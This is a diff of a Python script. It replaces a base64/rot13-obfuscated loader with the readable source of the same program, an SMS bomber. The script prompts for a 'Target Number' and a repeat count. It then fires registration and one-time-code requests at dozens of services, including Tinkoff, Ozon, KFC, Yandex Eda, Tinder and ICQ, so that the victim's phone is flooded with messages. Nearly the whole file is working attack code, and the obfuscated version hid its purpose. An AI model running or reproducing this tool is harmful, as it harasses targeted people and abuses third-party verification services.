@@ -1,11 +1,40 @@
-# Python code obfuscated by www.development-tools.net 
- 
-
-import base64, codecs
-magic = 'bnVtID0gaW5wdXQoJ0VudGVyIFRhcmdldCBOdW1iZXIgLS0tPiAgJykKbGltID0gaW50KGlucHV0KCdFbnRlciBMaW1pdCAtLS0+ICAgJykpCm51bXBsdXMgPSAnKycgKyBudW0KZGVmIHNwYW0oKToKCXRyeToKCQlwcmludChyZXF1ZXN0cy5wb3N0KCJodHRwOi8vbW9iaWxlLWFwaS5tZXRyb3BvbGlzLm1vc2Nvdy92MS9yZWdpc3RlciIsZGF0YSA9IHsncGhvbmUnOiBudW19KSkKCQlwcmludChyZXF1ZXN0cy5wb3N0KCJodHRwOi8vbW9iaWxlLWFwaS5tZXRyb3BvbGlzLm1vc2Nvdy92MS9zZW5kLWNvZGUiLCBkYXRhID0geydwaG9uZSc6IG51bX0pKQoJCXByaW50KHJlcXVlc3RzLnBvc3QoImh0dHA6Ly9hcGkucm96YW1pcmEtYXpzLnJ1L3YxL2F1dGgiLCBkYXRhID0geydsb2dpbic6IG51bX0pKQoJCXByaW50KHJlcXVlc3RzLnBvc3QoImh0dHA6Ly9hcHAubWFoZWV2Lm9yZy9MTUEvcmVnaXN0cmF0aW9uL3JlZ2lzdHJhdGVfY2xpZW50P2JpcnRoZGF5PTE0LjAyLjIwMDEmcGF0cm9ueW1pYz1EZCZwaG9uZT0iK251bSsiJnN1cm5hbWU9RmZyJnNleD0xJm5hbWU9RGYiKSkKCQlwcmludChyZXF1ZXN0cy5wb3N0KCJodHRwOi8vbWlsYW5vLWVuZ2Vscy5ydS9hamF4L2xvZ2luUGhvbmU/c3NpZD1kN2YxZjViYS01NzhkLTQzODAtOWFkYy01MDMxY2UzYWEwYmUmbW9iaWxlQXBwPXRydWUmcmVzdGF1cmFudD1lZGViYmU2Zi1mYTJhLTRhNDktYmZiNS1lMzAxZGVlZTQ3YzUmcGhvbmU9KyIrbnVtKyImY291bnRyeT1SVSIpKQoJCXByaW50KHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9zdWFuZHNoaS5ydS9tb2JpbGVfYXBpL3JlZ2lzdGVyX21vYmlsZV91c2VyP3Bob25lPSIrbnVtWzE6XSkpCgkJcHJpbnQocmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcGkuaXZpLnJ1L21vYmlsZWFwaS91c2VyL3JlZ2lzdGVyL3Bob25lL3Y2LycsIGRhdGEgPSB7J3Bob25lJzogbnVtI'
-love = 'PjtW2EyqzywMFp6VPqKnJ5xo3qmX3LhAQZeD2ulo21yX3LhAmD1ZmD1ZFpfVPqupUOsqzIlp2yiovp6VPp4AmNasFxcPtxWpUWcoaDbpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl93q3pho3ciov5lqF9upTxiL29gpT9mMKVgLKOcYzW4Y19uL3Eco24iMzSmqRIhqUW5WljtnaAiovN9VUfapTuiozHaBvOhqJ0tYPNao3EjFJDaBvNjsFxcPtxWpUWcoaDbpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl9upTxhqTyhn29zMv5lqF92ZF9mnJqhK3IjWljtMTS0LFN9VUfapTuiozHaBvOhqJ1joUImsFxcPtxWpUWcoaDbpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl93q3phMTIfnKMypaxgL2k1Lv5lqF9unzS4Y3ImMKWso3EjWljtMTS0LFN9VUfapTuiozHaBvOhqJ0tsFxcPtxWpUWcoaDbpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl9znJ5xL2kiozHhpaHipzIanKA0MKV/pTuiozH9r30aYzMipz1uqPuhqJ0cXFxXPDyjpzyhqPulMKS1MKA0pl5jo3A0XPqbqUEjpmbiY2SjnF5eMzZhL29gY2SjnF91p2Ilpl92ZF91p2IlYaMypzyzrFpfVTcmo24tCFO7VzEyqzywMFV6rlWxMKMcL2IWMPV6Vz5yq19eMzAsq2IvK3AcqTHvYPWxMKMcL2IHrKOyVwbvoJ9vnJkyVa0fVPWwpzIuqTIxDKDvBvVlZQVjYGNlYGR1IQR2BwD4BwN0YwR3ZybvYPNvpTuiozHvBvOhqJ1joUImsFxcPtxWpUWcoaDbpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl9yMTRhrJShMTI4Y2SjnF92ZF91p2IlY3WypKIyp3EsLKI0nTIhqTywLKEco25sL29xMFpfVTcmo24tCFO7W3Obo25yK251oJWypvp6VT51oKOfqKA9XFxXPDyjpzyhqPulMKS1MKA0pl5jo3A0XPqbqUEjpmbiY3yiqJkuYaW1Y3qyLv1upTxiLKI0nP9lMKS1MKA0K2AiMTHaYPOdp29hVQ0trlWjnT9hMFV6oaIgpTk1p30cXDbWPKOlnJ50XUWypKIyp3EmYaOip3DbW2u0qUOmBv8iLKOcYzqiqTyhMTIlYzAioF92Zv9uqKEbY3Agpl9mMJ5xC2S1qTusqUyjMG1moKZzoT'
-god = '9jYWxlPXJ1JywganNvbj0geyJwaG9uZV9udW1iZXIiOm51bXBsdXN9KSkKCQlwcmludChyZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5pY3EuY29tL3Ntc3JlZy9yZXF1ZXN0UGhvbmVWYWxpZGF0aW9uLnBocC8/bXNpc2RuPXt9JmxvY2FsZT1lbiZjb3VudHJ5Q29kZT1ydSZrPWljMXJ0d3oxczFIajFPMHImdmVyc2lvbj0xJnI9NDY3NjMnLmZvcm1hdChudW0pKSkKCQlwcmludChyZXF1ZXN0cy5wb3N0KCdodHRwczovL2thcGliYXJhcy5ydS9hcGkvbGsvc2VuZENvZGUnLCBqc29uID0geyJwaG9uZSI6IG51bXBsdXMsImNpdHkiOjF9KSkKCQlwcmludChyZXF1ZXN0cy5wb3N0KCdodHRwczovL2FwaS5tdHN0di5ydS92MS91c2VycycsIGpzb24gPSB7Im1zaXNkbiI6IG51bX0pKQoJCXByaW50KHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYXBpLXVzZXIucHJpdmV0bWlyLnJ1L2FwaS92Mi9zZW5kLWNvZGUnLCBkYXRhID0geyJiYWNrX3VybCI6ICIvcmVnaXN0ZXIvc3RlcC0yLyIsICJzY29wZSI6ICJyZWdpc3Rlci11c2VyIHJlc2V0LXBhc3N3b3JkIiwgImxvZ2luIjogbnVtcGx1cywgImNoZWNrQXBwcm92ZXMiOiJZIiwiYXBwcm92ZTEiOiJvbiIsImFwcHJvdmUyIjoib24ifSkpCgkJcHJpbnQocmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9tb3Njb3cucnV0YXhpLnJ1L2FqYXhfa2V5Y29kZS5odG1sP3FpcD0xMjA2OTgyMzg4NzMzNjg3Jmxhbmc9cnUmc291cmNlPTAnLCBkYXRhID0geyJsIjogbnVtfSkpCgkJcHJpbnQocmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ydXR1YmUucnUvYXBpL2FjY291bnRzL3NlbmRwYXNzL3Bob25lJywgZGF0YSA9IHsicGhvbmUiOiBudW1wbHVzfSkpCgkJcHJpbnQocmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcGkuc3VubGlnaHQubmV0L3YzL2N1c3RvbWVycy9hdXRob3JpemF0aW9uLycsIGRhdGEgPSB7InBob25lIjpudW19KSkKCQl'
-destiny = 'jpzyhqPulMKS1MKA0pl5jo3A0XPqbqUEjpmbiY2SjnF5cL29hnz9vYzAiY2SjnF9uqKEbY3MypzyznJAuqTyioy9wo2EyWljtMTS0LFN9VUfvpTuiozHvBvOhqJ19XFxXPDyjpzyhqPulMKS1MKA0pl5aMKDbW2u0qUOmBv8ipzIanKA0MKVhp2yjozI0YaW1Y2AanF1vnJ4iMKuwnTShM2HhMTkfY1WyM2ymqTIlFTIfpTIlC29jMKV9BFMwLJkfoJ9xMG0kWaObo25yCFptXlOhqJ0cXDbWPJuyLJEypaZtCFO7W0AioaEyoaDgqUyjMFp6VPqupUOfnJAuqTyiov9dp29hW30XPDyjpzyhqPulMKS1MKA0pl5jo3A0XPqbqUEjpmbiY2SjpP5eLKW1p2IfYaW1Y2SjnF92ZF9jnT9hMI9zpzIyYlpfVTcmo24tCFO7VaObo25yVwbtoaIgVU0fVTuyLJEypaZtCFObMJSxMKWmXFxXPDyjpzyhqPulMKS1MKA0pl5aMKDbW2u0qUOmBv8irz9fo3EiAGt1YaW1Y3WyM2ymqUWuL2y5LI9eLKW0rF9moKZhpTujC2qyqS9moKZ9ZFM0rKOyCJ5yqlMzow0yEQNyBGVyEQNyBGNyEQNyDGRyEQNyBGtyEQNyBHVyEQNyDHZyEQNyBGHyEQNyBGVyEQNyBGNzp249WHDjWGx4WHDjWHRjWHDjWGx4WHDjWGyRWHDjWGxjWaEhCFIRZPH5DFIRZPH5ZPIRZPIOZPIRZPH5BPIRZPH5EPIRZPH5EFIRZPH5ZvIRZPH5EPIRZPH5ZPMmMKt9ZFMxMQ0kZv4kZv4kBGxjWaAfCFIRZPH5DlIRZPIPEFIRZFH4ZFIRZPIPDFIRZPIPZvIRZPIPZPMjnT9hMG0yZxVaVPftoaIgVPftWlMyoJScoQ1yMTMmMaAxM2LyAQOgLJyfYaW1WlxcPtxWpUWcoaDbpzIkqJImqUZhpT9mqPtvnUE0pQbiYmR5AP41BP45ZP4kZQHiqwRioJHipzIanKA0pzS0nJ9hC3Obo25yCFVtXlOhqJ0fqTygMJ91qQ0lXFxXPJI4L2IjqPOSrTAypUEco24tLKZtMKWlBtbtVPNtVPNtVPNtVPOjpzyhqPtaMKWlVTS0VUAypaMcL2HaYPOypaVcPtxWPzMipvOcVTyhVUWuozqyXQNfoTygXGbXPKAjLJ0bXDbWpUWcoaDbW0S0qTSwnlOmqTSlqTyhMl4aXDb='
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+import requests
+num = input('Enter Target Number --->  ')
+lim = int(input('Enter Limit --->   '))
+numplus = '+' + num
+def spam():
+	try:
+		print(requests.post("http://mobile-api.metropolis.moscow/v1/register",data = {'phone': num}))
+		print(requests.post("http://mobile-api.metropolis.moscow/v1/send-code", data = {'phone': num}))
+		print(requests.post("http://api.rozamira-azs.ru/v1/auth", data = {'login': num}))
+		print(requests.post("http://app.maheev.org/LMA/registration/registrate_client?birthday=14.02.2001&patronymic=Dd&phone="+num+"&surname=Ffr&sex=1&name=Df"))
+		print(requests.post("http://milano-engels.ru/ajax/loginPhone?ssid=d7f1f5ba-578d-4380-9adc-5031ce3aa0be&mobileApp=true&restaurant=edebbe6f-fa2a-4a49-bfb5-e301deee47c5&phone=+"+num+"&country=RU"))
+		print(requests.get("https://suandshi.ru/mobile_api/register_mobile_user?phone="+num[1:]))
+		print(requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', data = {'phone': num , 'device': 'Windows+v.43+Chrome+v.7453451', 'app_version': '870'}))
+		print(requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json = {'phone': num , 'otpId': 0}))
+		print(requests.post('https://api.tinkoff.ru/v1/sign_up', data = {'phone': numplus}))
+		print(requests.post('https://www.delivery-club.ru/ajax/user_otp', data = {'phone': num }))
+		print(requests.post('https://findclone.ru/register?phone={}'.format(num)))
+		print(requests.post('https://api.kfc.com/api/users/v1/user.verify', json = {"device":{"deviceId":"new_kfc_web_site","deviceType":"mobile"}, "createdAt":"2020-02-15T16:48:04.172Z", "phone": numplus}))
+		print(requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': numplus}))
+		print(requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":numplus}))
+		print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', json= {"phone_number":numplus}))
+		print(requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num)))
+		print(requests.post('https://kapibaras.ru/api/lk/sendCode', json = {"phone": numplus,"city":1}))
+		print(requests.post('https://api.mtstv.ru/v1/users', json = {"msisdn": num}))
+		print(requests.post('https://api-user.privetmir.ru/api/v2/send-code', data = {"back_url": "/register/step-2/", "scope": "register-user reset-password", "login": numplus, "checkApproves":"Y","approve1":"on","approve2":"on"}))
+		print(requests.post('https://moscow.rutaxi.ru/ajax_keycode.html?qip=1206982388733687&lang=ru&source=0', data = {"l": num}))
+		print(requests.post('https://rutube.ru/api/accounts/sendpass/phone', data = {"phone": numplus}))
+		print(requests.post('https://api.sunlight.net/v3/customers/authorization/', data = {"phone":num}))
+		print(requests.post('https://api.iconjob.co/api/auth/verification_code', data = {"phone": num}))
+		print(requests.get('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone=' + num))
+		headers = {'Content-type': 'application/json'}
+		print(requests.post('https://app.karusel.ru/api/v1/phone_free/', json = {"phone": num }, headers = headers))
+		print(requests.get('https://zoloto585.ru/registraciya_karty/sms.php?get_sms=1&type=new&fn=%D0%92%D0%90%D0%A1%D0%98%D0%9B%D0%AC%D0%95%D0%92%D0%90&sn=%D0%98%D0%A0%D0%98%D0%9D%D0%90&tn=%D0%9A%D0%90%D0%A0%D0%98%D0%9D%D0%9E%D0%92%D0%9D%D0%90&sex=1&dd=12.12.1990&sl=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0&phone=%2B' + num + '&email=edfsfsdgf%40mail.ru'))
+		print(requests.post("http://194.58.90.105/v1/me/registration?phone=" + num,timeout=2))
+	except Exception as err:
+            print('err at service', err)
+		
+for i in range(0,lim):
+	spam()
+	print('Attack starting.')
